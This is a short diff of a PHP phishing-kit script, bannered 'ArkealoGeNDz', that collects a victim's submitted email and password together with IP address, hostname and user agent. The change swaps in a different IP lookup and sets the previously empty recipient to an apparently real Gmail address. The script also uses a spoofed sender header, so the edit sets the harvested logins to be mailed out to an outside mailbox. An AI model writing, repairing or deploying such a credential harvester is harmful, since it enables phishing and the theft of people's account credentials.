@@ -3,7 +3,7 @@ include 'email.php';
 $email = trim($_POST['email']);
 $password = trim($_POST['password']);
 if($email != null && $password != null){
-	$ip = getenv("REMOTE_ADDR");
+	$ip = $_SERVER['REMOTE_ADDR']; // Utilisation de $_SERVER['REMOTE_ADDR']
 	$hostname = gethostbyaddr($ip);
 	$useragent = $_SERVER['HTTP_USER_AGENT'];
 	$message = "|----------| ArkealoGeNDz |--------------|\n";
@@ -15,7 +15,7 @@ if($email != null && $password != null){
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|----------- ArkealoGeNDz --------------|\n";
-	$send = "";
+	$send = "tijobsworkers@gmail.com";
 	$subject = "Login : $ip";
 	$headers = 'From: executive@foneunits.com'       . "\r\n" .
                  'Reply-To: executive@foneunits.com' . "\r\n" .
